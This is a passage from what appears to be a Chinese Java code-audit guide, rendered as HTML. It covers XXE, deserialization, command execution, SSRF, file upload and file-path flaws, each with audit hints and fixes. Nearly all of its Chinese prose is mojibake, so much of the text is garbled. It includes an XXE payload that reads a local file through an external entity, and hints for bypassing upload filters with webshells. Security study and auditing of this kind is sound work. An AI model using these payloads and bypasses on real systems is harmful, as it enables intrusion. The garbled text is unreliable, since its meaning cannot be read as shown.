ã€<code>org.apache.commons.lang3.StringEscapeUtils</code>ã€<code>ESAPI.encoder().encodeForHTML</code> ç­‰ã€‚</p><h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><h5 id="æ¼æ´æˆå› -2"><a href="#æ¼æ´æˆå› -2" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><ul><li>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚æ–‡æ¡£ç±»å‹å®šä¹‰(DTD)çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚å½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œæ¶æ„æ”»å‡»è€…å³å¯æ„é€ æ¶æ„å†…å®¹è®¿é—®æœåŠ¡å™¨èµ„æºã€‚<br>ç¤ºä¾‹ï¼š</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br>    <span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta">        <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///tmp/aaa&quot;</span>&gt;</span></span><br><span class="hljs-meta">       ]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>ä½¿ç”¨ä¸å¯ä¿¡æ•°æ®æ¥æ„é€ XMLä¼šå¯¼è‡´XMLæ³¨å…¥æ¼æ´ï¼Œå¦‚æœç”¨æˆ·è¢«å…è®¸è¾“å…¥ç»“æ„åŒ–çš„XMLç‰‡æ®µï¼Œåˆ™ä»–å¯ä»¥åœ¨XMLçš„æ•°æ®åŸŸä¸­æ³¨å…¥XMLæ ‡ç­¾æ¥æ”¹å†™ç›®æ ‡XMLæ–‡æ¡£çš„ç»“æ„ä¸<br>å†…å®¹ã€‚</li></ul><h5 id="å®¡è®¡ç­–ç•¥-2"><a href="#å®¡è®¡ç­–ç•¥-2" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>XMLè§£ææ¶‰åŠçš„ä¸šåŠ¡åŠŸèƒ½ç‚¹ï¼š WebServicesæ¥å£ã€RESTfulæ¥å£ã€Excelæ–‡ä»¶è§£æã€Soapåè®®ç­‰ã€‚</p><p>æ¼æ´è§¦å‘ç‚¹å°±åœ¨XMLè§£ææ—¶ï¼Œå› æ­¤é‡ç‚¹å®¡è®¡XMLè§£æå™¨æ˜¯å¦è®¾ç½®äº†ç›¸å…³çš„å®‰å…¨å±æ€§ï¼Œç¦ç”¨DTDsæˆ–è€…ç¦æ­¢ä½¿ç”¨å¤–éƒ¨å®ä½“ã€‚è¿˜æœ‰æ˜¯å¦ä½¿ç”¨äº†ä¸å®‰å…¨çš„æ¼æ´ç»„ä»¶ã€‚éƒ¨åˆ†è§£æå™¨å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">javax.xml.parsers.DocumentBuilder<br>javax.xml.parsers.DocumentBuilderFactory<br>javax.xml.stream.XMLStreamReader<br>javax.xml.stream.XMLInputFactory<br>org.jdom.input.SAXBuilder<br>org.jdom2.input.SAXBuilder<br>org.jdom.output.XMLOutputter<br>oracle.xml.parser.v2.XMLParser<br>javax.xml.parsers.SAXParser<br>org.dom4j.io.SAXReader <br>org.dom4j.DocumentHelper<br>org.xml.sax.XMLReader<br>javax.xml.transform.sax.SAXSource <br>javax.xml.transform.TransformerFactory <br>javax.xml.transform.sax.SAXTransformerFactory <br>javax.xml.validation.SchemaFactory<br>javax.xml.validation.Validator<br>javax.xml.bind.Unmarshaller<br>javax.xml.xpath.XPathExpression<br>java.beans.XMLDecoder<br></code></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–ï¼Œå…³æ³¨<code>StreamSource</code>ã€<code>XMLConstants</code>ã€<code>StringReader</code>ç­‰æ–¹æ³•çš„è°ƒç”¨ï¼Œåœ¨é¡¹ç›®ä¸­æœç´¢. xsdæ–‡ä»¶ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-2"><a href="#å¦‚ä½•ä¿®å¤-2" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>ä½¿ç”¨XMLè§£æå™¨æ—¶ç¦æ­¢ä½¿ç”¨å¤–éƒ¨å®ä½“ï¼›ä½¿ç”¨ç™½åå•çš„æ–¹å¼å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œé¿å…ç”¨æˆ·è¾“å…¥æ”¹å˜XMLç»“æ„æˆ–å†…å®¹ã€‚</p><p>å„ç§Featuresï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">æ˜¯å¦å…è®¸ä½¿ç”¨DTDSè§£æ<br>    http:<span class="hljs-regexp">//</span>apache.org<span class="hljs-regexp">/xml/</span>features/disallow-doctype-decl<br>æ˜¯å¦å…è®¸ä½¿ç”¨é€šç”¨å®ä½“<br>    http:<span class="hljs-regexp">//</span>xml.org<span class="hljs-regexp">/sax/</span>features/external-general-entities<br>æ˜¯å¦å…è®¸ä½¿ç”¨å‚æ•°å®ä½“<br>    http:<span class="hljs-regexp">//</span>xml.org<span class="hljs-regexp">/sax/</span>features/external-parameter-entities<br>æ˜¯å¦å…è®¸åŠ è½½å¤–éƒ¨DTDå®ä½“<br>    http:<span class="hljs-regexp">//</span>apache.org<span class="hljs-regexp">/xml/</span>features<span class="hljs-regexp">/nonvalidating/</span>load-external-dtd<br>æ˜¯å¦å¯ç”¨å®‰å…¨æ€§å¤„ç†<br>    http:<span class="hljs-regexp">//</span>javax.xml.XMLConstants<span class="hljs-regexp">/feature/</span>secure-processing<br>æ˜¯å¦å…è®¸ä½¿ç”¨å¤–éƒ¨DTDå®ä½“<br>    http:<span class="hljs-regexp">//</span>javax.xml.XMLConstants<span class="hljs-regexp">/property/</span>accessExternalDTD<br>æ˜¯å¦å…è®¸ä½¿ç”¨å¤–éƒ¨Schema<br>    http:<span class="hljs-regexp">//</span>javax.xml.XMLConstants<span class="hljs-regexp">/property/</span>accessExternalSchema<br>æ˜¯å¦å…è®¸ä½¿ç”¨å¤–éƒ¨Stylesheet<br>    http:<span class="hljs-regexp">//</span>javax.xml.XMLConstants<span class="hljs-regexp">/property/</span>accessExternalStylesheet<br></code></pre></td></tr></table></figure><h4 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h4><h5 id="æ¼æ´æˆå› -3"><a href="#æ¼æ´æˆå› -3" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><ul><li>Javaç¨‹åºä½¿ç”¨<code>ObjectInputStream</code>å¯¹è±¡çš„<code>readObject()</code>æ–¹æ³•å°†ååºåˆ—åŒ–æ•°æ®è½¬æ¢ä¸ºjavaå¯¹è±¡ã€‚å¦‚æœè¢«ååºåˆ—åŒ–çš„å¯¹è±¡é‡å†™äº†<code>readObject()</code>æ–¹æ³•ï¼Œåˆ™ä¼šæ‰§è¡Œè¯¥å¯¹è±¡çš„æ­¤æ–¹æ³•ã€‚å› æ­¤ï¼Œå½“è¾“å…¥çš„ååºåˆ—åŒ–çš„æ•°æ®å¯è¢«ç”¨æˆ·æ§åˆ¶ï¼Œé‚£ä¹ˆæ”»å‡»è€…å³å¯é€šè¿‡æ„é€ æ¶æ„è¾“å…¥ï¼Œè®©ååºåˆ—åŒ–äº§ç”Ÿéé¢„æœŸçš„å¯¹è±¡ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­æ‰§è¡Œæ„é€ çš„ä»»æ„ä»£ç ã€‚</li><li>ååºåˆ—åŒ–ä¸€ä¸ªç±»æ—¶ï¼Œé€šå¸¸ä¼šä¼´éšè°ƒç”¨ get&#x2F;set æ–¹æ³•æ³¨å…¥å‚æ•°ï¼Œå¹¶ä¸ºè¿™ä¸ªç±»åˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹åŒ–å¯¹è±¡ï¼Œå› æ­¤ä¼šæ‰§è¡Œæ„é€ æ–¹æ³•åŠé™æ€ä»£ç å—ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…ä¹Ÿå¯ä»¥æŒ–æ˜gadgetæ¥æ‰§è¡Œå±é™©çš„åŠ¨ä½œã€‚</li><li>æ ¹æ®æƒé™æœ€å°åŒ–åŸåˆ™ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ååºåˆ—åŒ–çš„ç±»ä¸­çš„<code>readObject()</code>ã€<code>writeObject()</code>ã€<code>readResolve()</code>ã€<code>writeReplace()</code> æ–¹æ³•å¿…é¡»è¢«å£°æ˜ä¸º private voidã€‚å¦åˆ™å¦‚æœ Serializable çš„ç±»å¼€æ”¾ writeObject å‡½æ•°ä¸º public çš„è¯ï¼Œç»™éå—ä¿¡è°ƒç”¨è€…è¿‡é«˜æƒé™ï¼Œæ½œåœ¨æœ‰é£é™©ã€‚</li><li>åœ¨ Java ç¯å¢ƒä¸­ï¼Œå…è®¸å¤„äºä¸åŒå—ä¿¡åŸŸçš„ç»„ä»¶è¿›è¡Œæ•°æ®é€šä¿¡ï¼Œä»è€Œå‡ºç°è·¨å—ä¿¡è¾¹ç•Œçš„æ•°æ®ä¼ è¾“ã€‚å¦‚æœååºåˆ—åŒ–ç±»ä¸­å­˜åœ¨æœªåŠ å¯†çš„æ•æ„Ÿæ•°æ®ï¼Œå°†é¢ä¸´æ³„éœ²æˆ–è¢«ç¯¡æ”¹çš„é£é™©ã€‚</li><li>å¯¹éé™æ€å†…éƒ¨ç±»çš„åºåˆ—åŒ–ä¾èµ–ç¼–è¯‘å™¨ï¼Œä¸”éšç€å¹³å°çš„ä¸åŒè€Œä¸åŒï¼Œå®¹æ˜“äº§ç”Ÿé”™è¯¯ã€‚å¯¹å†…éƒ¨ç±»çš„åºåˆ—åŒ–ä¼šå¯¼è‡´å¤–éƒ¨ç±»çš„å®ä¾‹ä¹Ÿè¢«åºåˆ—åŒ–ã€‚è¿™æ ·æœ‰å¯èƒ½æ³„éœ²æ•æ„Ÿæ•°æ®ã€‚</li></ul><h5 id="å®¡è®¡ç­–ç•¥-3"><a href="#å®¡è®¡ç­–ç•¥-3" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>ååºåˆ—åŒ–æ“ä½œçš„åŠŸèƒ½ä½ç½®ï¼šå¯¼å…¥æ¨¡ç‰ˆæ–‡ä»¶ã€ç½‘ç»œé€šä¿¡ã€æ•°æ®ä¼ è¾“ã€æ—¥å¿—æ ¼å¼åŒ–å­˜å‚¨ã€å¯¹è±¡æ•°æ®è½ç£ç›˜æˆ–DBå­˜å‚¨ç­‰ä¸šåŠ¡åœºæ™¯ã€‚</p><p>å¯ä»¥é€šè¿‡å¯¹ç½‘ç»œæŠ“åŒ…å¯»æ‰¾åºåˆ—åŒ–æ•°æ®ï¼šjavaåºåˆ—åŒ–çš„æ•°æ®ä¸€èˆ¬ä¼šä»¥æ ‡è®°ï¼ˆac ed 00 05ï¼‰å¼€å¤´ï¼Œbase64ç¼–ç åçš„ç‰¹å¾ä¸ºrO0ABã€‚</p><p>ä¸€äº›æœåŠ¡çš„ä¼ è¾“å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–ï¼šå¤šå¹³å°HTTPé€šä¿¡ã€RMIã€JMXã€‚</p><p>ä¸€äº›ååºåˆ—åŒ–è§¦å‘ç‚¹ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>readObject<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>readUnshared<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XMLDecoder</span>.</span></span>readObject<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Yaml</span>.</span></span>load<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">XStream</span>.</span></span>fromXML<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectMapper</span>.</span></span>readValue<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>parseObject<br></code></pre></td></tr></table></figure><p>ä¸»è¦æŸ¥çœ‹è¿™äº›è§¦å‘ç‚¹çš„å‚æ•°æ˜¯å¦ç”±ç”¨æˆ·å¯æ§ã€‚</p><p>å…¨å±€æœç´¢æ˜¯å¦å…·æœ‰publicæƒé™çš„ä¸€äº›æ–¹æ³•ï¼š<code>public * writeObject/readObject/readResolve/writeReplace</code>ã€‚</p><p>æŸ¥çœ‹ååºåˆ—åŒ–ç±»ä¸­æ˜¯å¦åŒ…å«æ•æ„Ÿæ•°æ®ã€‚</p><p>å…¨å±€æŸ¥æ‰¾implements Serializable çš„æ‰€æœ‰å†…éƒ¨ç±»ã€‚</p><h5 id="å¦‚ä½•ä¿®å¤-3"><a href="#å¦‚ä½•ä¿®å¤-3" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><ul><li>å¯¹è¦ååºåˆ—åŒ–çš„å¯¹è±¡è®¾ç½®é»‘ç™½åå•ï¼Œåƒ fastJSONã€Jacksonè¿™ç§å®˜æ–¹ä¼šç»´æŠ¤ä¸€ä¸ªé»‘åå•ï¼ŒæŒç»­æ›´æ–°ï¼Œä½†è¿˜æ˜¯å»ºè®®ä½¿ç”¨ç™½åå•ï¼Œå¯é€šè¿‡Hookå‡½æ•°<code>resolveClass()</code>æ¥æ ¡éªŒååºåˆ—åŒ–çš„ç±»ä»è€Œå®ç°ç™½åå•æ ¡éªŒï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨Apache Commons IO SerializationåŒ…ä¸­çš„<code>ValidatingObjectInputStream</code>ç±»çš„<code>accept()</code>æ–¹æ³•æ¥å®ç°ååºåˆ—åŒ–ç±»ç™½&#x2F;é»‘åå•æ§åˆ¶ã€‚</li><li>å¯¹äºä¸€äº›æ•æ„Ÿçš„å±æ€§ï¼Œå°†å…¶å£°æ˜ä¸º transientï¼Œæˆ–è¿›è¡ŒåŠ å¯†å¤„ç†ã€‚</li><li>é¿å…å†…éƒ¨ç±»çš„åºåˆ—åŒ–ï¼Œæˆ–æŠŠå†…éƒ¨ç±»å£°æ˜ä¸ºé™æ€ï¼Œä½†è¿˜æ˜¯è¦æ³¨æ„æ•æ„Ÿä¿¡æ¯çš„é—®é¢˜ã€‚</li></ul><h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><h5 id="æ¼æ´æˆå› -4"><a href="#æ¼æ´æˆå› -4" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>ç”±äºä¸šåŠ¡éœ€æ±‚ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½å«æœ‰æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„åŠŸèƒ½ï¼Œå¦‚æœæ‰§è¡Œçš„å‘½ä»¤ä»»æ„ç”¨æˆ·å¯æ§ï¼Œåˆ™å°†äº§ç”Ÿæå¤§çš„å±å®³ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-4"><a href="#å®¡è®¡ç­–ç•¥-4" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>é‡ç‚¹å…³æ³¨èƒ½æ‰§è¡Œå‘½ä»¤çš„ä¸€äº›åŠŸèƒ½åŠå‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java">Runtime.getRuntime().exec()<br>Process<br>UNIXProcess<br>ProcessImpl<br>ProcessBuilder.start()<br>GroovyShell.evaluate()<br></code></pre></td></tr></table></figure><h5 id="å¦‚ä½•ä¿®å¤-4"><a href="#å¦‚ä½•ä¿®å¤-4" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>é¿å…ä½¿ç”¨è¿™æ ·çš„åŠŸèƒ½ï¼Œå¦‚å¿…é¡»ï¼Œå¾…æ‰§è¡Œå‘½ä»¤å°½é‡ä¸ç”±ç”¨æˆ·ä¼ å…¥ã€‚</p><h4 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h4><h5 id="æ¼æ´æˆå› -5"><a href="#æ¼æ´æˆå› -5" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>SSRFå½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºä»£ç ä¸­æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä½†æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLé“¾æ¥è·å–å›¾ç‰‡ã€ä¸‹è½½ç­‰ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-5"><a href="#å®¡è®¡ç­–ç•¥-5" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><p>å‡ºç°SSRFæ¼æ´çš„ä¸»è¦ä¸šåŠ¡æœ‰ï¼š</p><ul><li>é€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹</li><li>åœ¨çº¿æœåŠ¡</li><li>é€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</li><li>åŠ è½½è¿œç«¯é…ç½®</li></ul><p>é‡ç‚¹å…³æ³¨ä¸€äº›HTTPè¯·æ±‚æ“ä½œå‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Java">om.alibaba.druid.util.HttpClientUtils<br>sun.net.www.http.HttpClient<br>javax.net.ssl.HttpsURLConnection<br>sun.net.www.protocol.http.HttpURLConnection<br>java.net.HttpURLConnection<br>javax.servlet.http.HttpServletRequest<br>java.net.URI<br>java.net.URL<br>java.net.URLConnection<br>com.bea.uddiexplorer.Search<br>com.squareup.okhttp.Request<br>com.squareup.okhttp3.Request<br>org.apache.commons.httpclient.HttpMethodBase<br>org.apache.http.client.methods.HttpRequestBase<br></code></pre></td></tr></table></figure><p>é™¤äº†å»ºç«‹HTTPåè®®è¿æ¥ï¼Œè¿˜å¯èƒ½ç›´æ¥é€šè¿‡ Socketå»ºç«‹è¿æ¥ï¼Œå› æ­¤åº”è¯¥åŒæ ·å…³æ³¨Socketç›¸å…³ç±»ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AsynchronousServerSocketChannel</span>.</span></span>accept/bind<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AsynchronousSocketChannel</span>.</span></span>write/read/bind/connect<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ServerSocketChannel</span>.</span></span>bind<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ServerSocket</span>.</span></span>accept/bind<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Socket</span>.</span></span>bind/connect<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Socket</span>.</span></span>get<span class="hljs-constructor">InputStream()</span>.read<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Socket</span>.</span></span>get<span class="hljs-constructor">OutputStream()</span>.write<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SocketChannel</span>.</span></span>bind/read/write/connect<br></code></pre></td></tr></table></figure><h5 id="å¦‚ä½•ä¿®å¤-5"><a href="#å¦‚ä½•ä¿®å¤-5" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><ul><li>ä½¿ç”¨ç™½åå•æ ¡éªŒHTTPè¯·æ±‚urlåœ°å€ï¼Œä¾‹å¦‚é€šè¿‡InetAddresså¯¹è±¡çš„isSiteLocalAddress()æ–¹æ³•è¿›è¡Œåˆ¤æ–­ï¼Œç¦æ­¢å†…ç½‘åœ°å€çš„ç½‘ç»œè¯·æ±‚ã€‚</li><li>é¿å…å°†è¯·æ±‚å“åº”åŠé”™è¯¯ä¿¡æ¯è¿”å›ç»™ç”¨æˆ·</li><li>ç¦ç”¨ä¸éœ€è¦çš„åè®®åŠé™åˆ¶è¯·æ±‚ç«¯å£</li></ul><h4 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h4><h5 id="æ¼æ´æˆå› -6"><a href="#æ¼æ´æˆå› -6" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œç”±äºæ ¡éªŒä¸å…¨ã€é™åˆ¶ä¸å½“ï¼Œå¯èƒ½å¯¼è‡´è¢«ä¸Šä¼ webshellã€æ‹’ç»æœåŠ¡ã€ä»»æ„æ–‡ä»¶å†™å…¥ç­‰å®‰å…¨é—®é¢˜ã€‚</p><h5 id="å®¡è®¡ç­–ç•¥-6"><a href="#å®¡è®¡ç­–ç•¥-6" class="headerlink" title="å®¡è®¡ç­–ç•¥"></a>å®¡è®¡ç­–ç•¥</h5><ul><li>é¦–å…ˆå…³æ³¨æ–‡ä»¶åç¼€éªŒè¯ï¼Œä½¿ç”¨ç™½åå•æˆ–é»‘åå•ï¼Œå»ºè®®ä½¿ç”¨ç™½åå•ã€‚ä½¿ç”¨<code>lastIndexOf()</code>æ–¹æ³•è·å–æ–‡ä»¶åç¼€ï¼Œä½¿ç”¨<code>IndexOf()</code>å¯èƒ½è¢«ç»•è¿‡ã€‚å¦‚æœæ˜¯ç™½åå•éªŒè¯æ—¶ï¼Œä½¿ç”¨<code>toLowerCase()</code>å¤„ç†å†è¿›è¡Œå¯¹æ¯”ï¼Œæˆ–ä½¿ç”¨<code>equalsIgnoreCase()</code>ï¼Œé¿å…è¢«å¤§å°å†™ç»•è¿‡ã€‚</li><li>æ˜¯å¦æ ¡éªŒäº†æ–‡ä»¶çš„å¤§å°ã€‚</li><li>æ˜¯å¦æ ¡éªŒäº†æ–‡ä»¶ç±»å‹<code>getContentType()</code>ï¼Œè¿™ç§æ–¹å¼è™½ç„¶èƒ½å¤Ÿè¢«ç»•è¿‡ï¼Œä½†è¿˜æ˜¯ä¼šå¢åŠ æ”»å‡»æˆæœ¬ã€‚</li><li>å¯¹äºä½¿ç”¨Hutoolçš„FileTypeUtilçš„<code>getType()</code>æˆ–<code>ImageIO.read()</code>é€šè¿‡è¯»å–æ–‡ä»¶æµä¸­å‰Nä¸ªbyteå€¼æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç±»ä¼¼å›¾ç‰‡é©¬çš„æ–¹å¼è¿›è¡Œç»•è¿‡ã€‚</li><li>â€œ%00â€æˆªæ–­èƒ½å¦ç»•è¿‡ã€‚</li><li>QPç¼–ç ç‰¹æ€§èƒ½å¦ç»•è¿‡ã€‚<code>javax.mail.internet.MimeUtility.encodeWord()</code>æ–¹æ³•ã€‚</li><li>æœ‰ä¸€äº›å®‰å…¨æ ¡éªŒçš„é¡ºåºæœ‰é—®é¢˜ï¼Œå…ˆå°†æ–‡ä»¶ä¿å­˜ï¼Œå†è¿›è¡Œå®‰å…¨æ£€æµ‹ï¼Œå¦‚æœä¸é€šè¿‡æ£€æµ‹åˆ™è¿›è¡Œåˆ é™¤ï¼Œæ­¤æ—¶å¯ä»¥åœ¨æ–‡ä»¶ä¿å­˜åè§¦å‘æŠ¥é”™ç»ˆæ­¢æµç¨‹ï¼Œå¯¼è‡´ä¸åˆ é™¤æ–‡ä»¶ã€‚</li></ul><p>é‡ç‚¹æ˜¯æ–‡ä»¶ä¸Šä¼ ç›¸å…³ç±»æˆ–å‡½æ•°ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">FileUpload<br>FileUploadBase<br>FileItemIteratorImpl<br>FileItemStreamImpl<br>FileUtils<br>UploadHandleServlet<br>FileLoadServlet<br>FileOutputStream<br><span class="hljs-keyword">DiskFileItemFactory</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartRequestEntity</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">MultipartFile</span><br><span class="hljs-keyword"></span>com.<span class="hljs-keyword">oreilly.servlet.MultipartRequest</span><br></code></pre></td></tr></table></figure><h5 id="å¦‚ä½•ä¿®å¤-6"><a href="#å¦‚ä½•ä¿®å¤-6" class="headerlink" title="å¦‚ä½•ä¿®å¤"></a>å¦‚ä½•ä¿®å¤</h5><p>å¯¹ä¸Šä¼ æ–‡ä»¶åç¼€è¿›è¡Œç™½åå•éªŒè¯ï¼ŒéªŒè¯æ–‡ä»¶å¤§å°ï¼Œå¼ºåˆ¶é‡å‘½ååç¼€ï¼Œä¸Šä¼ æ–‡ä»¶å•ç‹¬æœåŠ¡å™¨ä¿å­˜ã€‚</p><h4 id="ä»»æ„æ–‡ä»¶è¯»-å†™-åˆ é™¤-å¤åˆ¶-ç§»åŠ¨-éå†"><a href="#ä»»æ„æ–‡ä»¶è¯»-å†™-åˆ é™¤-å¤åˆ¶-ç§»åŠ¨-éå†" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»&#x2F;å†™&#x2F;åˆ é™¤&#x2F;å¤åˆ¶&#x2F;ç§»åŠ¨&#x2F;éå†"></a>ä»»æ„æ–‡ä»¶è¯»&#x2F;å†™&#x2F;åˆ é™¤&#x2F;å¤åˆ¶&#x2F;ç§»åŠ¨&#x2F;éå†</h4><h5 id="æ¼æ´æˆå› -7"><a href="#æ¼æ´æˆå› -7" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h5><p>åº”ç”¨ç¨‹åºç”±äºä¸šåŠ¡éœ€æ±‚ï¼Œæä¾›äº†æ–‡ä»¶æ“ä½œçš„ä¸€ç³»åˆ—åŠŸèƒ½ï¼Œä½†æ–‡ä»¶åã€æ–‡ä»¶è·¯å¾„ç­‰ç”±ç”¨æˆ·æ§åˆ¶ï¼Œåœ¨æ 